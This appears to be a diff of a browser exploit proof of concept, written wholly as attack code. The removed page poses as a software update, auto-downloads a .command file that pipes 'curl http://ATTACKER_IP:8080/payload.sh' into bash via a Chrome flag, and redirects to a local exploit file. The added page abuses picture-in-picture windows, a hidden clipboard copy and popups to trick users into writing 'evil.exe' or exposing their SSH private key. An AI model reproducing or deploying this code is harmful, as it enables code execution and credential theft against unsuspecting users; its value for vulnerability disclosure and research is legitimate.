@@ -1,35 +1,68 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Important Update</title>
-</head>
-<body>
-    <h1>Your software needs an update</h1>
-    
-    <script>
-        function triggerExploit() {
-            // Method 1: Create and trigger download of malicious .command file
-            const payload = `#!/bin/bash
-/Applications/Google\\\\ Chrome.app/Contents/MacOS/Google\\\\ Chrome "--utility-cmd-prefix=curl http://ATTACKER_IP:8080/payload.sh | bash" http://google.com &
-echo "Update completed"`;
+<button onclick="start()">Click here</button>
+<input id="upload" type="file" style="display:none" onchange="loadFile(this.files[0])">
 
-            const blob = new Blob([payload], {type: 'application/octet-stream'});
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = 'SoftwareUpdate.command';
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            
-            // Method 2: Redirect to local file protocol
-            setTimeout(() => {
-                window.location = 'file:///tmp/exploit.html';
-            }, 1000);
-        }
-        
-        // Auto-trigger after page load
-        window.onload = triggerExploit;
-    </script>
-</body>
-</html>
+<pre id="contents"></pre>
+
+<script>
+const fileWritePath = "%userprofile%\\\\evil.exe";
+const fileReadPath = "%userprofile%\\\\.ssh\\\\id_rsa";
+
+async function loadFile(file) {
+  window.moveTo(0, 0);
+  window.resizeTo(500, 500);
+  alert(`Read ${fileReadPath}:\n` + await (new Response(file)).text());
+}
+
+const pipOpen = async () => {
+  pipWindow = await documentPictureInPicture.requestWindow({
+    width: Math.pow(2,32),
+    height: Math.pow(2,32),
+  });
+  pipWindow.document.body.innerHTML = `
+  <button onclick="read=false;eval(document.querySelector('script').innerText)">Start file writing game!</button><br>
+  <button onclick="read=true;eval(document.querySelector('script').innerText)">Start file reading game!</button>
+  <script>
+  copyToClipboard(read ? "${fileReadPath}" : "${fileWritePath}");
+  const popup = window.open("${document.location.href}", read ? "popup-read" : "popup-write", "popup");
+  popup.resizeTo(200,200);
+  popup.moveTo(window.screenLeft + 30,window.screenTop + 30);
+
+  setTimeout(()=>
+    document.body.innerHTML = "<p>Press " + (read ? "enter, then " : "") + "ctrl+v and enter to win this game!</p>",
+    400
+  );
+
+  function copyToClipboard(text) {
+    const textarea = document.createElement("textarea");
+    textarea.style.opacity = "0%";
+    textarea.textContent = text;
+    document.body.appendChild(textarea);
+    textarea.select();
+    document.execCommand("copy");
+  }
+
+  <${'/'}script>
+  `;
+};
+
+function download(data, filename, type) {
+  const file = new Blob([data], {type: type});
+  const a = document.createElement("a");
+  const url = window.URL.createObjectURL(file);
+  a.href = url;
+  a.download = filename;
+  document.body.appendChild(a);
+  a.click();
+}
+
+function start() {
+  pipOpen();
+}
+
+if (window.name == "popup-write") {
+  download("This is an evil executable", "harmless");
+  document.body.onfocus = () => setTimeout(() => window.close(), 1000);
+} else if (window.name == "popup-read") {
+  document.body.onkeydown = () => document.getElementById("upload").click();
+}
+</script>
